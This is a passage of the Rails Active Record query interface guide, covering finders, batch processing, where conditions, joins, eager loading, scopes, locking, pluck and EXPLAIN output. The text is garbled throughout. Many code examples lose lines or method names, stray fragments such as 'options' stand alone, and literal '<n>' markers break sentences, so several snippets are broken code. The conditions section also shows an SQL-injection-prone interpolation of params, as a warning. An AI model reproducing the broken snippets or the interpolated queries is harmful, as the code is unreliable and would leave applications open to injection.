The `last` method returns `nil` if no matching record is found and no exception will be raised.
You can pass in a numerical argument to the `last` method to return up to that number of results. 
client = Client.last(3)
  #<Client id: 219, first_name: "James">,
  #<Client id: 220, first_name: "Sara">,
  #<Client id: 221, first_name: "Russel">
SELECT * FROM clients ORDER BY clients.id DESC LIMIT 3
The `last!` method behaves exactly like `last`, except that it will raise `ActiveRecord::RecordNotFound` if no matching record is found.
#### `find_by`
The `find_by` method finds the first record matching some conditions. 
Client.find_by first_name: 'Lifo'
Client.find_by first_name: 'Jon'
# => nil
It is equivalent to writing:
Client.where(first_name: 'Lifo').take
The `find_by!` method behaves exactly like `find_by`, except that it will raise `ActiveRecord::RecordNotFound` if no matching record is found. 
Client.find_by! 
first_name: 'does not exist'
# => ActiveRecord::RecordNotFound
This is equivalent to writing:
Client.where(first_name: 'does not exist').take!
### Retrieving Multiple Objects in Batches
We often need to iterate over a large set of records, as when we send a newsletter to a large set of users, or when we export data.
This may appear straightforward:
# This is very inefficient when the users table has thousands of rows.
User.all.each do |user|
  NewsMailer.weekly(user).deliver_now
But this approach becomes increasingly impractical as the table size increases, since `User.all.each` instructs Active Record to fetch _the entire table_ in a single pass, build a model object per row, and then keep the entire array of model objects in memory. 
Indeed, if we have a large number of records, the entire collection may exceed the amount of memory available.
Rails provides two methods that address this problem by dividing records into memory-friendly batches for processing. 
The first method, `find_each`, retrieves a batch of records and then yields _each_ record to the block individually as a model. 
The second method, `find_in_batches`, retrieves a batch of records and then yields _the entire batch_ to the block as an array of models.
TIP: The `find_each` and `find_in_batches` methods are intended for use in the batch processing of a large number of records that wouldn't fit in memory all at once. 
If you just need to loop over a thousand records the regular find methods are the preferred option.
#### `find_each`
The `find_each` method retrieves a batch of records and then yields _each_ record to the block individually as a model. 
In the following example, `find_each` will retrieve 1000 records (the current default for both `find_each` and `find_in_batches`) and then yield each record individually to the block as a model. 
This process is repeated until all of the records have been processed:
User.find_each do |user|
To add conditions to a `find_each` operation you can chain other Active Record methods such as `where`:
User.where(weekly_subscriber: true).find_each do |user|
##### Options for `find_each`
The `find_each` method accepts most of the options allowed by the regular `find` method, except for `:order` and `:limit`, which are reserved for internal use by `find_each`.
**`:batch_size`**
The `:batch_size` option allows you to specify the number of records to be retrieved in each batch, before being passed individually to the block. 
For example, to retrieve records in batches of 5000:
User.find_each(batch_size: 5000) do |user|
By default, records are fetched in ascending order of the primary key, which must be an integer. 
This would be useful, for example, if you wanted to resume an interrupted batch process, provided you saved the last processed ID as a checkpoint.
For example, to send newsletters only to users with the primary key starting from 2000, and to retrieve them in batches of 5000:
#### `find_in_batches`
The `find_in_batches` method is similar to `find_each`, since both retrieve batches of records. 
The difference is that `find_in_batches` yields _batches_ to the block as an array of models, instead of individually. 
The following example will yield to the supplied block an array of up to 1000 invoices at a time, with the final block containing any remaining invoices:
# Give add_invoices an array of 1000 invoices at a time
Invoice.find_in_batches do |invoices|
  export.add_invoices(invoices)
##### Options for `find_in_batches`
options
Conditions
----------
The `where` method allows you to specify conditions to limit the records returned, representing the `WHERE`-part of the SQL statement. 
Conditions can either be specified as a string, array, or hash.
### Pure String Conditions
If you'd like to add conditions to your find, you could just specify them in there, just like `Client.where("orders_count = '2'")`. 
This will find all clients where the `orders_count` field's value is 2.
WARNING: Building your own conditions as pure strings can leave you vulnerable to SQL injection exploits. 
For example, `Client.where("first_name LIKE '%#{params[:first_name]}%'")` is not safe. 
See the next section for the preferred way to handle conditions using an array.
### Array Conditions
Now what if that number could vary, say as an argument from somewhere? 
The find would then take the form:
Client.where("orders_count = ?", params[:orders])
Active Record will go through the first element in the conditions value and any additional elements will replace the question marks `(?)` in the first element.
If you want to specify multiple conditions:
AND locked = ?", params[:orders], false)
In this example, the first question mark will be replaced with the value in `params[:orders]` and the second will be replaced with the SQL representation of `false`, which depends on the adapter.
This code is highly preferable:
to this code:
Client.where("orders_count = #{params[:orders]}")
Putting the variable directly into the conditions string will pass the variable to the database **as-is**. 
This means that it will be an unescaped variable directly from a user who may have malicious intent. 
If you do this, you put your entire database at risk because once a user finds out they can exploit your database they can do just about anything to it. 
Never ever put your arguments directly inside the conditions string.
TIP: For more information on the dangers of SQL injection, see the [Ruby on Rails Security Guide](security.html#sql-injection).
#### Placeholder Conditions
Similar to the `(?)` replacement style of params, you can also specify keys/values hash in your array conditions:
Client.where("created_at >= :start_date AND created_at <= :end_date",
  {start_date: params[:start_date], end_date: params[:end_date]})
This makes for clearer readability if you have a large number of variable conditions.
### Hash Conditions
Active Record also allows you to pass in hash conditions which can increase the readability of your conditions syntax. 
With hash conditions, you pass in a hash with keys of the fields you want conditionalised and the values of how you want to conditionalise them:
NOTE: Only equality, range and subset checking are possible with Hash conditions.
#### Equality Conditions
Client.where(locked: true)
The field name can also be a string:
Client.where('locked' => true)
In the case of a belongs_to relationship, an association key can be used to specify the model if an Active Record object is used as the value. 
This method works with polymorphic relationships as well.
Article.where(author: author)
Author.joins(:articles).where(articles: { author: author })
NOTE: The values cannot be symbols. 
For example, you cannot do `Client.where(status: :active)`.
#### Range Conditions
Client.where(created_at: (Time.now.midnight - 1.day)..
This will find all clients created yesterday by using a `BETWEEN` SQL statement:
SELECT * FROM clients WHERE (clients.created_at BETWEEN '2008-12-21 00:00:00' AND '2008-12-22 00:00:00')
This demonstrates a shorter syntax for the examples in [Array Conditions](#array-conditions)
#### Subset Conditions
If you want to find records using the `IN` expression you can pass an array to the conditions hash:
Client.where(orders_count: [1,3,5])
This code will generate SQL like this:
SELECT * FROM clients WHERE (clients.orders_count IN (1,3,5))
### NOT Conditions
`NOT` SQL queries can be built by `where.not`.
Article.where.not(author: author)
In other words, this query can be generated by calling `where` with no argument, then immediately chain with `not` passing `where` conditions.
Ordering
To retrieve records from the database in a specific order, you can use the `order` method.
For example, if you're getting a set of records and want to order them in ascending order by the `created_at` field in your table:
Client.order(:created_at)
Client.order("created_at")
You could specify `ASC` or `DESC` as well:
Client.order(created_at: :desc)
Client.order(created_at: :asc)
Client.order("created_at DESC")
Client.order("created_at ASC")
Or ordering by multiple fields:
Client.order(orders_count: :asc, created_at: :desc)
Client.order(:orders_count, created_at: :desc)
Client.order("orders_count ASC, created_at DESC")
Client.order("orders_count ASC", "created_at DESC")
Client.order("orders_count ASC").order("created_at DESC")
# SELECT * FROM clients ORDER BY orders_count ASC, created_at DESC
Selecting Specific Fields
By default, `Model.find` selects all the fields from the result set using `select *`.
To select only a subset of fields from the result set, you can specify the subset via the `select` method.
For example, to select only `viewable_by` and `locked` columns:
Client.select("viewable_by, locked")
The SQL query used by this find call will be somewhat like:
SELECT viewable_by, locked FROM clients
Be careful because this also means you're initializing a model object with only the fields that you've selected. 
If you attempt to access a field that is not in the initialized record you'll receive:
```bash
Where `<attribute>` is the attribute you asked for. 
The `id` method will not raise the `ActiveRecord::MissingAttributeError`, so just be careful when working with associations because they need the `id` method to function properly.
If you would like to only grab a single record per unique value in a certain field, you can use `distinct`:
Client.select(:name).distinct
This would generate SQL like:
SELECT DISTINCT name FROM clients
You can also remove the uniqueness constraint:
query = Client.select(:name).distinct
# => Returns unique names
query.distinct(false)
# => Returns all names, even if there are duplicates
Limit and Offset
To apply `LIMIT` to the SQL fired by the `Model.find`, you can specify the `LIMIT` using `limit` and `offset` methods on the relation.
You can use `limit` to specify the number of records to be retrieved, and use `offset` to specify the number of records to skip before starting to return the records. 
Client.limit(5)
will return a maximum of 5 clients and because it specifies no offset it will return the first 5 in the table. 
The SQL it executes looks like this:
SELECT * FROM clients LIMIT 5
Adding `offset` to that
Client.limit(5).offset(30)
will return instead a maximum of 5 clients beginning with the 31st. 
The SQL looks like:
SELECT * FROM clients LIMIT 5 OFFSET 30
Group
-----
To apply a `GROUP BY` clause to the SQL fired by the finder, you can specify the `group` method on the find.
For example, if you want to find a collection of the dates orders were created on:
Order.select("date(created_at) as ordered_date, sum(price) as total_price").group("date(created_at)")
And this will give you a single `Order` object for each date where there are orders in the database.
The SQL that would be executed would be something like this:
SELECT date(created_at) as ordered_date, sum(price) as total_price
FROM orders
GROUP BY date(created_at)
### Total of grouped items
To get the total of grouped items on a single query call `count` after the `group`.
Order.group(:status).count
# => { 'awaiting_approval' => 7, 'paid' => 12 }
SELECT COUNT (*) AS count_all, status AS status
FROM "orders"
GROUP BY status
Having
------
SQL uses the `HAVING` clause to specify conditions on the `GROUP BY` fields. 
Order.select("date(created_at) as ordered_date, sum(price) as total_price").
  group("date(created_at)").having("sum(price) > ?", 100)
HAVING sum(price) > 100
This will return single order objects for each day, but only those that are ordered more than $100 in a day.
Overriding Conditions
### `unscope`
You can specify certain conditions to be removed using the `unscope` method. 
Article.where('id > 10').limit(20).order('id asc').unscope(:order)
The SQL that would be executed:
SELECT * FROM articles WHERE id > 10 LIMIT 20
# Original query without `unscope`
SELECT * FROM articles WHERE id > 10 ORDER BY id asc LIMIT 20
You can also unscope specific `where` clauses. 
Article.where(id: 10, trashed: false).unscope(where: :id)
# SELECT "articles".
* FROM "articles" WHERE trashed = 0
A relation which has used `unscope` will affect any relation it is<n>merged in to:
Article.order('id asc').merge(Article.unscope(:order))
* FROM "articles"
### `only`
You can also override conditions using the `only` method. 
Article.where('id > 10').limit(20).order('id desc').only(:order, :where)
SELECT * FROM articles WHERE id > 10 ORDER BY id DESC
# Original query without `only`
SELECT "articles".
* FROM "articles" WHERE (id > 10) ORDER BY id desc LIMIT 20
### `reorder`
The `reorder` method overrides the default scope order. 
class Article < ActiveRecord::Base
  has_many :comments, -> { order('posted_at DESC') }
Article.find(10).comments.reorder('name')
SELECT * FROM articles WHERE id = 10
SELECT * FROM comments WHERE article_id = 10 ORDER BY name
In case the `reorder` clause is not used, the SQL executed would be:
SELECT * FROM comments WHERE article_id = 10 ORDER BY posted_at DESC
### `reverse_order`
The `reverse_order` method reverses the ordering clause if specified.
Client.where("orders_count > 10").order(:name).reverse_order
SELECT * FROM clients WHERE orders_count > 10 ORDER BY name DESC
If no ordering clause is specified in the query, the `reverse_order` orders by the primary key in reverse order.
Client.where("orders_count > 10").reverse_order
This method accepts **no** arguments.
### `rewhere`
The `rewhere` method overrides an existing, named where condition. 
Article.where(trashed: true).rewhere(trashed: false)
SELECT * FROM articles WHERE `trashed` = 0
In case the `rewhere` clause is not used,
Article.where(trashed: true).where(trashed: false)
the SQL executed would be:
SELECT * FROM articles WHERE `trashed` = 1 AND `trashed` = 0
Null Relation
-------------
The `none` method returns a chainable relation with no records. 
Any subsequent conditions chained to the returned relation will continue generating empty relations. 
This is useful in scenarios where you need a chainable response to a method or a scope that could return zero results.
Article.none # returns an empty Relation and fires no queries.
# The visible_articles method below is expected to return a Relation.
@articles = current_user.visible_articles.where(name: params[:name])
def visible_articles
  case role
  when 'Country Manager'
    Article.where(country: country)
  when 'Reviewer'
    Article.published
  when 'Bad User'
    Article.none # => returning [] or nil breaks the caller code in this case
Readonly Objects
Active Record provides `readonly` method on a relation to explicitly disallow modification of any of the returned objects. 
Any attempt to alter a readonly record will not succeed, raising an `ActiveRecord::ReadOnlyRecord` exception.
client = Client.readonly.first
client.visits += 1
client.save
As `client` is explicitly set to be a readonly object, the above code will raise an `ActiveRecord::ReadOnlyRecord` exception when calling `client.save` with an updated value of _visits_.
Locking Records for Update
Locking is helpful for preventing race conditions when updating records in the database and ensuring atomic updates.
Active Record provides two locking mechanisms:
* Optimistic Locking
* Pessimistic Locking
### Optimistic Locking
Optimistic locking allows multiple users to access the same record for edits, and assumes a minimum of conflicts with the data. 
It does this by checking whether another process has made changes to a record since it was opened. 
An `ActiveRecord::StaleObjectError` exception is thrown if that has occurred and the update is ignored.
**Optimistic locking column**
In order to use optimistic locking, the table needs to have a column called `lock_version` of type integer. 
Each time the record is updated, Active Record increments the `lock_version` column. 
If an update request is made with a lower value in the `lock_version` field than is currently in the `lock_version` column in the database, the update request will fail with an `ActiveRecord::StaleObjectError`. 
Example:
c1 = Client.find(1)
c2 = Client.find(1)
c1.first_name = "Michael"
c1.save
c2.name = "should fail"
c2.save # Raises an ActiveRecord::StaleObjectError
You're then responsible for dealing with the conflict by rescuing the exception and either rolling back, merging, or otherwise apply the business logic needed to resolve the conflict.
This behavior can be turned off by setting `ActiveRecord::Base.lock_optimistically = false`.
To override the name of the `lock_version` column, `ActiveRecord::Base` provides a class attribute called `locking_column`:
  self.locking_column = :lock_client_column
### Pessimistic Locking
Pessimistic locking uses a locking mechanism provided by the underlying database. 
Using `lock` when building a relation obtains an exclusive lock on the selected rows. 
Relations using `lock` are usually wrapped inside a transaction for preventing deadlock conditions.
Item.transaction do
  i = Item.lock.first
  i.name = 'Jones'
  i.save!
The above session produces the following SQL for a MySQL backend:
BEGIN
Item Load (0.3ms)   SELECT * FROM `items` LIMIT 1 FOR UPDATE
Item Update (0.4ms)   UPDATE `items` SET `updated_at` = '2009-02-07 18:05:56', `name` = 'Jones' WHERE `id` = 1
SQL (0.8ms)   COMMIT
You can also pass raw SQL to the `lock` method for allowing different types of locks. 
For example, MySQL has an expression called `LOCK IN SHARE MODE` where you can lock a record but still allow other queries to read it. 
To specify this expression just pass it in as the lock option:
  i = Item.lock("LOCK IN SHARE MODE").find(1)
  i.increment!(:views)
If you already have an instance of your model, you can start a transaction and acquire the lock in one go using the following code:
item = Item.first
item.with_lock do
  # This block is called within a transaction,
  # item is already locked.
  item.increment!(:views)
Joining Tables
--------------
Active Record provides a finder method called `joins` for specifying `JOIN` clauses on the resulting SQL. There are multiple ways to use the `joins` method.
### Using a String SQL Fragment
You can just supply the raw SQL specifying the `JOIN` clause to `joins`:
Client.joins('LEFT OUTER JOIN addresses ON addresses.client_id = clients.id')
This will result in the following SQL:
SELECT clients.
* FROM clients LEFT OUTER JOIN addresses ON addresses.client_id = clients.id
### Using Array/Hash of Named Associations
WARNING: This method only works with `INNER JOIN`.
Active Record lets you use the names of the [associations](association_basics.html) defined on the model as a shortcut for specifying `JOIN` clauses for those associations when using the `joins` method.
For example, consider the following `Category`, `Article`, `Comment`, `Guest` and `Tag` models:
class Category < ActiveRecord::Base
  has_many :articles
  belongs_to :category
  has_many :comments
  has_many :tags
class Comment < ActiveRecord::Base
  belongs_to :article
  has_one :guest
  belongs_to :comment
class Tag < ActiveRecord::Base
Now all of the following will produce the expected join queries using `INNER JOIN`:
#### Joining a Single Association
Category.joins(:articles)
This produces:
SELECT categories.
* FROM categories
  INNER JOIN articles ON articles.category_id = categories.id
Or, in English: "return a Category object for all categories with articles". 
Note that you will see duplicate categories if more than one article has the same category. 
If you want unique categories, you can use `Category.joins(:articles).uniq`.
#### Joining Multiple Associations
Article.joins(:category, :comments)
SELECT articles.
* FROM articles
  INNER JOIN categories ON articles.category_id = categories.id
  INNER JOIN comments ON comments.article_id = articles.id
Or, in English: "return all articles that have a category and at least one comment". 
Note again that articles with multiple comments will show up multiple times.
#### Joining Nested Associations (Single Level)
Article.joins(comments: :guest)
  INNER JOIN guests ON guests.comment_id = comments.id
Or, in English: "return all articles that have a comment made by a guest."
#### Joining Nested Associations (Multiple Level)
Category.joins(articles: [{ comments: :guest }, :tags])
  INNER JOIN tags ON tags.article_id = articles.id
### Specifying Conditions on the Joined Tables
You can specify conditions on the joined tables using the regular [Array](#array-conditions) and [String](#pure-string-conditions) conditions. 
[Hash conditions](#hash-conditions) provides a special syntax for specifying conditions for the joined tables:
time_range = (Time.now.midnight - 1.day)..
Client.joins(:orders).where('orders.created_at' => time_range)
An alternative and cleaner syntax is to nest the hash conditions:
Client.joins(:orders).where(orders: { created_at: time_range })
This will find all clients who have orders that were created yesterday, again using a `BETWEEN` SQL expression.
Eager Loading Associations
Eager loading is the mechanism for loading the associated records of the objects returned by `Model.find` using as few queries as possible.
**N + 1 queries problem**
Consider the following code, which finds 10 clients and prints their postcodes:
clients = Client.limit(10)
clients.each do |client|
  puts client.address.postcode
This code looks fine at the first sight. 
But the problem lies within the total number of queries executed. 
The above code executes 1 (to find 10 clients) + 10 (one per each client to load the address) = **11** queries in total.
**Solution to N + 1 queries problem**
Active Record lets you specify in advance all the associations that are going to be loaded. 
This is possible by specifying the `includes` method of the `Model.find` call. 
With `includes`, Active Record ensures that all of the specified associations are loaded using the minimum possible number of queries.
Revisiting the above case, we could rewrite `Client.limit(10)` to use eager load addresses:
clients = Client.includes(:address).limit(10)
The above code will execute just **2** queries, as opposed to **11** queries in the previous case:
SELECT * FROM clients LIMIT 10
SELECT addresses.
* FROM addresses
  WHERE (addresses.client_id IN (1,2,3,4,5,6,7,8,9,10))
### Eager Loading Multiple Associations
Active Record lets you eager load any number of associations with a single `Model.find` call by using an array, hash, or a nested hash of array/hash with the `includes` method.
#### Array of Multiple Associations
Article.includes(:category, :comments)
This loads all the articles and the associated category and comments for each article.
#### Nested Associations Hash
Category.includes(articles: [{ comments: :guest }, :tags]).find(1)
This will find the category with id 1 and eager load all of the associated articles, the associated articles' tags and comments, and every comment's guest association.
### Specifying Conditions on Eager Loaded Associations
Even though Active Record lets you specify conditions on the eager loaded associations just like `joins`, the recommended way is to use [joins](#joining-tables) instead.
However if you must do this, you may use `where` as you would normally.
Article.includes(:comments).where(comments: { visible: true })
This would generate a query which contains a `LEFT OUTER JOIN` whereas the<n>`joins` method would generate one using the `INNER JOIN` function instead.
  SELECT "articles"."id" AS t0_r0, ... "comments"."updated_at" AS t1_r5 FROM "articles" LEFT OUTER JOIN "comments" ON "comments"."article_id" = "articles"."id" WHERE (comments.visible = 1)
If there was no `where` condition, this would generate the normal set of two queries.
NOTE: Using `where` like this will only work when you pass it a Hash. 
Article.includes(:comments).where("comments.visible = true").references(:comments)
If, in the case of this `includes` query, there were no comments for any<n>articles, all the articles would still be loaded. 
By using `joins` (an INNER<n>JOIN), the join conditions **must** match, otherwise no records will be<n>returned.
Scopes
Scoping allows you to specify commonly-used queries which can be referenced as method calls on the association objects or models. 
With these scopes, you can use every method previously covered such as `where`, `joins` and `includes`. 
All scope methods will return an `ActiveRecord::Relation` object which will allow for further methods (such as other scopes) to be called on it.
To define a simple scope, we use the `scope` method inside the class, passing the query that we'd like to run when this scope is called:
  scope :published, -> { where(published: true) }
This is exactly the same as defining a class method, and which you use is a matter of personal preference:
  def self.published
    where(published: true)
Scopes are also chainable within scopes:
  scope :published,               -> { where(published: true) }
  scope :published_and_commented, -> { published.where("comments_count > 0") }
To call this `published` scope we can call it on either the class:
category = Category.first
category.articles.published # => [published articles belonging to this category]
### Passing in arguments
Your scope can take arguments:
  scope :created_before, ->(time) { where("created_at < ?", time) }
Call the scope as if it were a class method:
Article.created_before(Time.zone.now)
However, this is just duplicating the functionality that would be provided to you by a class method.
  def self.created_before(time)
    where("created_at < ?", time)
Using a class method is the preferred way to accept arguments for scopes. 
These methods will still be accessible on the association objects:
category.articles.created_before(time)
### Applying a default scope
If we wish for a scope to be applied across all queries to the model we can use the<n>`default_scope` method within the model itself.
  default_scope { where("removed_at IS NULL") }
When queries are executed on this model, the SQL query will now look something like<n>this:
SELECT * FROM clients WHERE removed_at IS NULL
If you need to do more complex things with a default scope, you can alternatively<n>define it as a class method:
  def self.default_scope
    # Should return an ActiveRecord::Relation.
### Merging of scopes
Just like `where` clauses scopes are merged using `AND` conditions.
class User < ActiveRecord::Base
  scope :active, -> { where state: 'active' }
  scope :inactive, -> { where state: 'inactive' }
User.active.inactive
# SELECT "users".
* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'inactive'
We can mix and match `scope` and `where` conditions and the final sql<n>will have all conditions joined with `AND`.
User.active.where(state: 'finished')
* FROM "users" WHERE "users"."state" = 'active' AND "users"."state" = 'finished'
User.active.merge(User.inactive)
* FROM "users" WHERE "users"."state" = 'inactive'
One important caveat is that `default_scope` will be prepended in<n>`scope` and `where` conditions.
  default_scope { where state: 'pending' }
User.all
* FROM "users" WHERE "users"."state" = 'pending'
User.active
* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'active'
User.where(state: 'inactive')
# SELECT "users".* FROM "users" WHERE "users"."state" = 'pending' AND "users"."state" = 'inactive'
As you can see above the `default_scope` is being merged in both<n>`scope` and `where` conditions.
### Removing All Scoping
If we wish to remove scoping for any reason we can use the `unscoped` method. 
This is<n>especially useful if a `default_scope` is specified in the model and should not be<n>applied for this particular query.
Client.unscoped.load
This method removes all scoping and will do a normal query on the table.
Note that chaining `unscoped` with a `scope` does not work. 
In these cases, it is<n>recommended that you use the block form of `unscoped`:
Client.unscoped {
  Client.created_before(Time.zone.now)
Dynamic Finders
For every field (also known as an attribute) you define in your table, Active Record provides a finder method. 
If you have a field called `first_name` on your `Client` model for example, you get `find_by_first_name` for free from Active Record. 
If you have a `locked` field on the `Client` model, you also get `find_by_locked` and methods.
You can specify an exclamation point (`!`) on the end of the dynamic finders to get them to raise an `ActiveRecord::RecordNotFound` error if they do not return any records, like `Client.find_by_name!("Ryan")`
If you want to find both by name and locked, you can chain these finders together by simply typing "`and`" between the fields. 
For example, `Client.find_by_first_name_and_locked("Ryan", true)`.
Find or Build a New Object
Active Record
It's common that you need to find a record or create it if it doesn't exist. 
You can do that with the `find_or_create_by` and `find_or_create_by!` methods.
### `find_or_create_by`
The `find_or_create_by` method checks whether a record with the attributes exists. 
If it doesn't, then `create` is called. 
Let's see an example.
Suppose you want to find a client named 'Andy', and if there's none, create one. 
You can do so by running:
Client.find_or_create_by(first_name: 'Andy')
# => #<Client id: 1, first_name: "Andy", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">
The SQL generated by this method looks like this:
SELECT * FROM clients WHERE (clients.first_name = 'Andy') LIMIT 1
INSERT INTO clients (created_at, first_name, locked, orders_count, updated_at) VALUES ('2011-08-30 05:22:57', 'Andy', 1, NULL, '2011-08-30 05:22:57')
COMMIT
`find_or_create_by` returns either the record that already exists or the new record. 
In our case, we didn't already have a client named Andy so the record is created and returned.
The new record might not be saved to the database; that depends on whether validations passed or not (just like `create`).
Suppose we want to set the 'locked' attribute to `false` if we're<n>creating a new record, but we don't want to include it in the query. 
So<n>we want to find the client named "Andy", or if that client doesn't<n>exist, create a client named "Andy" which is not locked.
We can achieve this in two ways. 
The first is to use `create_with`:
Client.create_with(locked: false).find_or_create_by(first_name: 'Andy')
The second way is using a block:
Client.find_or_create_by(first_name: 'Andy') do |c|
  c.locked = false
The block will only be executed if the client is being created. 
The<n>second time we run this code, the block will be ignored.
### `find_or_create_by!
You can also use `find_or_create_by!` to raise an exception if the new record is invalid. 
Validations are not covered on this guide, but let's assume for a moment that you temporarily add
validates :orders_count, presence: true
to your `Client` model. 
If you try to create a new `Client` without passing an `orders_count`, the record will be invalid and an exception will be raised:
first_name: 'Andy')
# => ActiveRecord::RecordInvalid: Validation failed: Orders count can't be blank
### `find_or_initialize_by`
The `find_or_initialize_by` method will work just like<n>`find_or_create_by` but it will call `new` instead of `create`. 
This<n>means that a new model instance will be created in memory but won't be<n>saved to the database. 
Continuing with the `find_or_create_by` example, we<n>now want the client named 'Nick':
nick = Client.find_or_initialize_by(first_name: 'Nick')
# => <Client id: nil, first_name: "Nick", orders_count: 0, locked: true, created_at: "2011-08-30 06:09:27", updated_at: "2011-08-30 06:09:27">
nick.persisted?
# => false
nick.new_record?
# => true
Because the object is not yet stored in the database, the SQL generated looks like this:
SELECT * FROM clients WHERE (clients.first_name = 'Nick') LIMIT 1
When you want to save it to the database, just call `save`:
nick.save
Finding by SQL
If you'd like to use your own SQL to find records in a table you can use `find_by_sql`. 
The `find_by_sql` method will return an array of objects even if the underlying query returns just a single record. 
For example you could run this query:
Client.find_by_sql("SELECT * FROM clients
  INNER JOIN orders ON clients.id = orders.client_id
  ORDER BY clients.created_at desc")
# =>  [
  #<Client id: 1, first_name: "Lucas" >,
  #<Client id: 2, first_name: "Jan" >,
  # ...
`find_by_sql` provides you with a simple way of making custom calls to the database and retrieving instantiated objects.
### `select_all`
`find_by_sql` has a close relative called `connection#select_all`. `select_all` will retrieve objects from the database using custom SQL just like `find_by_sql` but will not instantiate them. 
Instead, you will get an array of hashes where each hash indicates a record.
Client.connection.select_all("SELECT first_name, created_at FROM clients WHERE id = '1'")
  {"first_name"=>"Rafael", "created_at"=>"2012-11-10 23:23:45.281189"},
  {"first_name"=>"Eileen", "created_at"=>"2013-12-09 11:22:35.221282"}
### `pluck`
`pluck` can be used to query single or multiple columns from the underlying table of a model. 
It accepts a list of column names as argument and returns an array of values of the specified columns with the corresponding data type.
Client.where(active: true).pluck(:id)
# SELECT id FROM clients WHERE active = 1
# => [1, 2, 3]
Client.distinct.pluck(:role)
# SELECT DISTINCT role FROM clients
# => ['admin', 'member', 'guest']
Client.pluck(:id, :name)
# SELECT clients.id, clients.name FROM clients
# => [[1, 'David'], [2, 'Jeremy'], [3, 'Jose']]
`pluck` makes it possible to replace code like:
Client.select(:id).map { |c| c.id }
Client.select(:id).map(&:id)
Client.select(:id, :name).map { |c| [c.id, c.name] }
with:
Client.pluck(:id)
Unlike `select`, `pluck` directly converts a database result into a Ruby `Array`,<n>without constructing `ActiveRecord` objects. 
This can mean better performance for<n>a large or often-running query. 
However, any model method overrides will<n>not be available. 
  def name
    "I am #{super}"
Client.select(:name).map &:name
# => ["I am David", "I am Jeremy", "I am Jose"]
Client.pluck(:name)
# => ["David", "Jeremy", "Jose"]
Furthermore, unlike `select` and other `Relation` scopes, `pluck` triggers an immediate<n>query, and thus cannot be chained with any further scopes, although it can work with<n>scopes already constructed earlier:
Client.pluck(:name).limit(1)
# => NoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>
Client.limit(1).pluck(:name)
# => ["David"]
### `ids`
`ids` can be used to pluck all the IDs for the relation using the table's primary key.
Person.ids
# SELECT id FROM people
class Person < ActiveRecord::Base
  self.primary_key = "person_id"
# SELECT person_id FROM people
Existence of Objects
If you simply want to check for the existence of the object there's a method called `exists?
This method will query the database using the same query as `find`, but instead of returning an<n>object or collection of objects it will return either `true` or `false`.
The `exists?` method also takes multiple values, but the catch is that it will return `true` if any<n>one of those records exists.
id: [1,2,3])
name: ['John', 'Sergei'])
It's even possible to use `exists?` without any arguments on a model or a relation.
Client.where(first_name: 'Ryan').exists?
The above returns `true` if there is at least one client with the `first_name` 'Ryan' and `false`<n>otherwise.
Client.exists?
The above returns `false` if the `clients` table is empty and `true` otherwise.
You can also use `any?` and `many?` to check for existence on a model or relation.
# via a model
Article.any?
Article.many?
# via a named scope
Article.recent.any?
Article.recent.many?
# via a relation
Article.where(published: true).any?
Article.where(published: true).many?
# via an association
Article.first.categories.any?
Article.first.categories.many?
Calculations
This section uses count as an example method in this preamble, but the options described apply to all sub-sections.
All calculation methods work directly on a model:
Client.count
# SELECT count(*) AS count_all FROM clients
Or on a relation:
Client.where(first_name: 'Ryan').count
# SELECT count(*) AS count_all FROM clients WHERE (first_name = 'Ryan')
You can also use various finder methods on a relation for performing complex calculations:
Client.includes("orders").where(first_name: 'Ryan', orders: { status: 'received' }).count
Which will execute:
SELECT count(DISTINCT clients.id) AS count_all FROM clients
  LEFT OUTER JOIN orders ON orders.client_id = client.id WHERE
  (clients.first_name = 'Ryan' AND orders.status = 'received')
### Count
If you want to see how many records are in your model's table you could call `Client.count` and that will return the number. 
If you want to be more specific and find all the clients with their age present in the database you can use `Client.count(:age)`.
For options, please see the parent section, [Calculations](#calculations).
### Average
If you want to see the average of a certain number in one of your tables you can call the `average` method on the class that relates to the table. 
This method call will look something like this:
Client.average("orders_count")
This will return a number (possibly a floating point number such as 3.14159265) representing the average value in the field.
### Minimum
If you want to find the minimum value of a field in your table you can call the `minimum` method on the class that relates to the table. 
Client.minimum("age")
### Maximum
If you want to find the maximum value of a field in your table you can call the `maximum` method on the class that relates to the table. 
Client.maximum("age")
### Sum
If you want to find the sum of a field for all records in your table you can call the `sum` method on the class that relates to the table. 
Client.sum("orders_count")
Running EXPLAIN
You can run EXPLAIN on the queries triggered by relations. 
For example,
User.where(id: 1).joins(:articles).explain
may yield
EXPLAIN for: SELECT `users`.
* FROM `users` INNER JOIN `articles` ON `articles`.`user_id` = `users`.`id` WHERE `users`.`id` = 1
+----+-------------+----------+-------+---------------+
| id | select_type | table    | type  | possible_keys |
|  1 | SIMPLE      | users    | const | PRIMARY       |
|  1 | SIMPLE      | articles | ALL   | NULL          |
+---------+---------+-------+------+-------------+
| key     | key_len | ref   | rows | Extra       |
| PRIMARY | 4       | const |    1 |             |
| NULL    | NULL    | NULL  |    1 | Using where |
2 rows in set (0.00 sec)
under MySQL.
So, the same query running with the PostgreSQL adapter would yield instead
EXPLAIN for: SELECT "users".
* FROM "users" INNER JOIN "articles" ON "articles"."user_id" = "users"."id" WHERE "users"."id" = 1
                                  QUERY PLAN
------------------------------------------------------------------------------
   Join Filter: (articles.user_id = users.id)
   ->  Index Scan using users_pkey on users  (cost=0.00..8.27 rows=1 width=4)
         Index Cond: (id = 1)
   ->  Seq Scan on articles  (cost=0.00..28.88 rows=8 width=4)
(6 rows)
Eager loading may trigger more than one query under the hood, and some queries<n>may need the results of previous ones. 
Because of that, `explain` actually<n>executes the query, and then asks for the query plans. 
User.where(id: 1).includes(:articles).explain
yields
* FROM `users`  WHERE `users`.`id` = 1
+----+-------------+-------+-------+---------------+
| id | select_type | table | type  | possible_keys |
|  1 | SIMPLE      | users | const | PRIMARY       |
+---------+---------+-------+------+-------+
| key     | key_len | ref   | rows | Extra |
| PRIMARY | 4       | const |    1 |       |
1 row in set (0.00 sec)
EXPLAIN for: SELECT `articles`.
* FROM `articles`  WHERE `articles`.`user_id` IN (1)
+----+-------------+----------+------+---------------+
| id | select_type | table    | type | possible_keys |
|  1 | SIMPLE      | articles | ALL  | NULL          |
+------+---------+------+------+-------------+
| key  | key_len | ref  | rows | Extra       |
| NULL | NULL    | NULL |    1 | Using where |
### Interpreting EXPLAIN
